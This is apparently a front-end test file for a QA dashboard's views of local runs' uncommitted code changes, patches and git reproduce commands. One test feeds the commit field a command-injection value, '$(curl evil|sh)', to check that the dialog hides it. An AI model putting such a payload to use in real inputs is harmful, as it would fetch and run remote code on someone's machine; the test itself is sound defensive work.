/**
 * The run tag, the batch callout, the changes dialog and the sidebar view of local runs' code changes.
 * Run with: cd webapp && npm test -- LocalChanges
 */
import { screen, fireEvent, within, waitFor } from '@testing-library/react';

import { renderWithProviders } from '../../../test-utils';
import { LocalChangesTag } from '../LocalChangesTag';
import LocalChangesDialog from '../LocalChangesDialog';
import LocalChangesView from '../LocalChangesView';
import { LocalChangesSharedContext, group_local_changes } from '../localChanges';
import { BatchStatusMessages } from '../../messages';
import { copyWithToast } from '../../../utils/clipboard';

vi.mock('../../MonacoEditor', () => ({
  default: ({ value, language }) => <pre data-testid="editor" data-language={language}>{value}</pre>,
  MonacoDiffEditor: ({ original, value }) => <pre data-testid="diff">{original} ➡️ {value}</pre>,
  preloadMonaco: () => {},
}));
vi.mock('../../../utils/clipboard', async importOriginal => ({ ...await importOriginal(), copyWithToast: vi.fn() }));

const changes = (more = {}) => ({
  level: 'patch', scope: 'run', dirty: true, head: '3f2a1b9c0d1e2f30', branch: 'feature/x', upstream: 'origin/feature/x',
  files: [{ path: 'src/a.py', status: 'M', added: 30, deleted: 10 }, { path: 'src/b.py', status: 'A', added: 10, deleted: 2 }, { path: 'img.png', status: '?', added: null, deleted: null, binary: true }],
  files_total: 3, added: 40, deleted: 12, untracked: 1, sha256: 'aaa', patch: { path: '.qaboard/local-changes.patch', bytes: 1234 },
  ...more,
});
const run = (id, local_changes, more = {}) => ({
  id, test_input_path: `in${id}.raw`, test_input_database: 'db', configurations: [], output_dir_url: `/s/${id}`,
  data: local_changes === undefined ? {} : { local_changes }, ...more,
});

const files = {
  '/s/1/.qaboard/local-changes.patch': 'diff --git a/src/a.py b/src/a.py\n+new\n',
  '/s/1/.qaboard/unpushed.patch': 'From abc\ndiff --git a/c.py b/c.py\n+unpushed\n',
  '/s/9/.qaboard/local-changes.patch': 'diff --git a/src/a.py b/src/a.py\n+old\n',
};
beforeEach(() => {
  vi.stubGlobal('fetch', vi.fn(url => Promise.resolve(url in files ? new Response(files[url]) : new Response('not found', { status: 404, statusText: 'NOT FOUND' }))));
  window.history.replaceState(null, '', '/p/commit/abc');
  copyWithToast.mockClear();
});
afterEach(() => vi.unstubAllGlobals());


describe('LocalChangesTag', () => {
  it('counts the changes, and opens them', async () => {
    renderWithProviders(<LocalChangesTag output={run(1, changes())}/>);
    fireEvent.click(screen.getByRole('button', { name: /Local changes \+40 −12 · 3 files/ }));
    expect(await screen.findByRole('dialog')).toBeInTheDocument();
    expect(await screen.findByTestId('editor')).toHaveTextContent('+new');
  });

  it('says when git could not tell', () => {
    renderWithProviders(<LocalChangesTag output={run(1, changes({ dirty: null, timed_out: true }))}/>);
    expect(screen.getByText('local changes unknown')).toBeInTheDocument();
  });

  it("shows nothing for clean runs, runs without data, and changes the batch's callout already says", () => {
    const { container } = renderWithProviders(<>
      <LocalChangesTag output={run(1, changes({ dirty: false }))}/>
      <LocalChangesTag output={run(2)}/>
      <LocalChangesSharedContext value="3f2a1b9c0d1e2f30:aaa"><LocalChangesTag output={run(3, changes())}/></LocalChangesSharedContext>
    </>);
    expect(container).toBeEmptyDOMElement();
    renderWithProviders(<LocalChangesSharedContext value="3f2a1b9c0d1e2f30:aaa"><LocalChangesTag output={run(4, changes({ sha256: 'bbb' }))}/></LocalChangesSharedContext>);
    expect(screen.getByText('+40 −12 · 3 files')).toBeInTheDocument();
  });
});


const batch_of = (runs, data = { type: 'local' }) => ({
  id: 1, batch_dir_url: '/s/batch', data,
  outputs: Object.fromEntries(runs.map(r => [r.id, r])),
  filtered: { outputs: runs.map(r => `${r.id}`), running_outputs: 0, pending_outputs: 0, deleted_outputs: 0 },
});
const renderBatch = runs => renderWithProviders(<BatchStatusMessages project="p" commit={{ id: 'abc' }} batch={batch_of(runs)} filter=""/>);

describe('the batch callout', () => {
  it('counts runs that differ only by their unpushed commits as different states', () => {
    renderBatch([run(1, changes()), run(2, changes({ pushed: false, unpushed_commits: 2 }))]);
    // they differ by their unpushed commits
    expect(screen.getByText('These local runs used 2 different sets of local changes')).toBeInTheDocument();
  });

  it('shared changes', async () => {
    renderBatch([run(1, changes({ pushed: false, unpushed_commits: 2 })), run(2, changes({ pushed: false, unpushed_commits: 2 }))]);
    expect(screen.getByText(/Local runs on/)).toHaveTextContent('Local runs on 3f2a1b9c with uncommitted changes: 3 files, +40 −12 · 2 unpushed commits');
    expect(screen.queryByText(/Be careful/)).toBeNull();
    fireEvent.click(screen.getByRole('button', { name: 'View changes' }));
    expect(await screen.findByRole('dialog')).toBeInTheDocument();
  });

  it('runs without local changes', () => {
    renderBatch([run(1, changes({ dirty: false })), run(2, changes({ dirty: false }))]);
    expect(screen.getByText(/Local runs on/)).toHaveTextContent('Local runs on 3f2a1b9c, without local changes');
    expect(screen.queryByRole('button', { name: /View/ })).toBeNull();
  });

  it('runs that differ open the list of states', async () => {
    renderBatch([run(1, changes()), run(2, changes({ sha256: 'bbb' })), run(3, changes({ dirty: false }))]);
    expect(screen.getByText('These local runs used 3 different sets of local changes')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'View' }));
    await waitFor(() => expect(new URLSearchParams(window.location.search).get('selected_views')).toBe('local-changes'));
  });

  it('offers to view changes git could not tell', () => {
    renderBatch([run(1, changes({ dirty: null })), run(2, changes({ dirty: null }))]);
    expect(screen.getByText(/Local runs on/)).toHaveTextContent("Local runs on 3f2a1b9c: git couldn't tell whether they had local changes");
    expect(screen.getByRole('button', { name: 'View' })).toBeInTheDocument();
  });

  it('keeps the old warning for runs that recorded nothing', () => {
    renderBatch([run(1), run(2)]);
    expect(screen.getByText('Be careful, those are local runs')).toBeInTheDocument();
  });
});


describe('LocalChangesDialog', () => {
  const open = (output, output_ref) => renderWithProviders(<LocalChangesDialog isOpen onClose={() => {}} output={output} output_ref={output_ref}/>, { siteConfig: { docs_root: '/qa/' } });

  it('lists the files, shows the patch, and how to reproduce', async () => {
    open(run(1, changes({ excluded: ['secrets.env', '.env'] })));
    const dialog = screen.getByRole('dialog');
    expect(dialog).toHaveTextContent('On 3f2a1b9c on feature/x · uncommitted changes: 3 files, +40 −12');
    expect(await screen.findByTestId('editor')).toHaveAttribute('data-language', 'diff');
    const list = within(screen.getByRole('list', { name: 'Changed files' }));
    // the files in the patch scroll it to their changes, the others are listed
    expect(list.getByRole('button', { name: 'src/a.py' })).toBeInTheDocument();
    expect(list.getByText('img.png')).toBeInTheDocument();
    expect(list.getByText('binary')).toBeInTheDocument();
    expect(screen.getByText(/Left out: secrets.env, .env/)).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Docs' })).toHaveAttribute('href', '/qa/docs/local-changes');
    expect(screen.getByRole('button', { name: /Download/ })).toHaveAttribute('href', '/s/1/.qaboard/local-changes.patch');
    expect(screen.getByText('git checkout 3f2a1b9c0d1e2f30 && git apply local-changes.patch')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: /Copy reproduce command/ }));
    expect(copyWithToast).toHaveBeenCalledWith('qa restore 1', expect.anything());
  });

  it.each([
    [{ omitted: 'too_large', bytes: 2048 * 1024 }, 'The patch is 2048 KB: too large to save (outputs.local_changes.max_patch_kb).'],
    [{ omitted: 'level' }, 'This server keeps only a summary of the code changes.'],
    [{ omitted: 'timeout' }, "git took too long to make the patch: it wasn't saved."],
  ])('says why the patch is missing: %o', (patch, message) => {
    open(run(1, changes({ patch })));
    expect(screen.getByText(message)).toBeInTheDocument();
    expect(screen.queryByTestId('editor')).toBeNull();
    expect(screen.queryByRole('button', { name: /Download/ })).toBeNull();
  });

  it('says when there were too many untracked files', () => {
    open(run(1, changes({ untracked_contents: 'too_many' })));
    expect(screen.getByText(/too many untracked files/)).toBeInTheDocument();
  });

  it('shows the unpushed commits', async () => {
    open(run(1, changes({ pushed: false, unpushed_commits: 2, base: 'bbbbbbbb', unpushed: { path: '.qaboard/unpushed.patch', bytes: 10, sha256: 'u' } })));
    expect(screen.getByText('git checkout bbbbbbbb && git apply unpushed.patch && git apply local-changes.patch')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('radio', { name: /Unpushed commits \(2\)/ }));
    expect(await screen.findByText(/\+unpushed/)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'c.py' })).toBeInTheDocument();
  });

  it("compares with the reference's changes", async () => {
    open(run(1, changes()), run(9, changes({ sha256: 'old' })));
    fireEvent.click(screen.getByRole('button', { name: "Compare with the reference's changes" }));
    expect(await screen.findByTestId('diff')).toHaveTextContent('+old ➡️ diff --git a/src/a.py b/src/a.py +new');
  });

  it('only shows patches small enough', async () => {
    files['/s/2/.qaboard/local-changes.patch'] = 'x'.repeat(6 * 1024 * 1024);
    open(run(2, changes()));
    expect(await screen.findByText(/too large to show here/)).toHaveTextContent('The patch is over 6.0 MB: too large to show here.');
    expect(screen.queryByTestId('editor')).toBeNull();
    delete files['/s/2/.qaboard/local-changes.patch'];
  });

  it("hides git commands built from what isn't a sha", () => {
    open(run(1, changes({ head: '$(curl evil|sh)' })));
    expect(screen.queryByText('With git')).toBeNull();
    expect(screen.getByRole('dialog')).not.toHaveTextContent('curl');
  });

  it("doesn't offer to compare the same changes", () => {
    open(run(1, changes()), run(9, changes()));
    expect(screen.queryByRole('button', { name: /Compare/ })).toBeNull();
  });
});


describe('LocalChangesView', () => {
  it('lists the distinct states, with their runs', () => {
    const groups = group_local_changes([run(1, changes()), run(2, changes()), run(3, changes({ dirty: false, pushed: true })), run(4)]);
    renderWithProviders(<LocalChangesView groups={groups}/>);
    expect(screen.getByText('The runs shown recorded 2 different sets of local changes. 1 run didn\'t record their local changes.')).toBeInTheDocument();
    expect(screen.getByText('Uncommitted changes: 3 files, +40 −12')).toBeInTheDocument();
    expect(screen.getByText('No local changes')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: '2 runs' }));
    expect(screen.getByText('in1.raw')).toBeInTheDocument();
    expect(screen.getByText('in2.raw')).toBeInTheDocument();
  });
});


describe('the Code menu', () => {
  it("says when the git host doesn't have the commit yet", async () => {
    const { Menu } = await import('@blueprintjs/core');
    const { CodeMenu } = await import('../../../AppSider');
    const project_data = { data: { git: { web_url: 'https://github.com/kitefin/isp', path_with_namespace: 'kitefin/isp' } } };
    renderWithProviders(<Menu><CodeMenu project="kitefin/isp" project_data={project_data} commit={{ id: '0123456789abcdef' }} unpushed={{ sha: '0123456789abcdef' }}/></Menu>);
    fireEvent.mouseEnter(screen.getByRole('menuitem', { name: /Code/ }));
    expect(await screen.findByText(/Not pushed: the git host doesn't have/)).toHaveTextContent("Not pushed: the git host doesn't have 01234567 yet");
    // links to the commit would 404: the menu goes to the repository, and to the last pushed commit
    expect(screen.getByRole('menuitem', { name: /Changes in/ })).toHaveAttribute('aria-disabled', 'true');
    const code = screen.getByRole('menuitem', { name: /^Code/ });
    expect((code.closest('a') ?? code.querySelector('a')).getAttribute('href')).toBe('https://github.com/kitefin/isp');
  });

  it('links to the last pushed commit', async () => {
    const { Menu } = await import('@blueprintjs/core');
    const { CodeMenu } = await import('../../../AppSider');
    const project_data = { data: { git: { web_url: 'https://github.com/kitefin/isp', path_with_namespace: 'kitefin/isp' } } };
    renderWithProviders(<Menu><CodeMenu project="kitefin/isp" project_data={project_data} commit={{ id: '0123456789abcdef' }} unpushed={{ sha: '0123456789abcdef', base: 'bbbbbbbbcccc' }}/></Menu>);
    fireEvent.mouseEnter(screen.getByRole('menuitem', { name: /Code/ }));
    const item = await screen.findByRole('menuitem', { name: /Last pushed commit, bbbbbbbb/ });
    expect((item.closest('a') ?? item.querySelector('a')).getAttribute('href')).toBe('https://github.com/kitefin/isp/commit/bbbbbbbbcccc');
  });
});
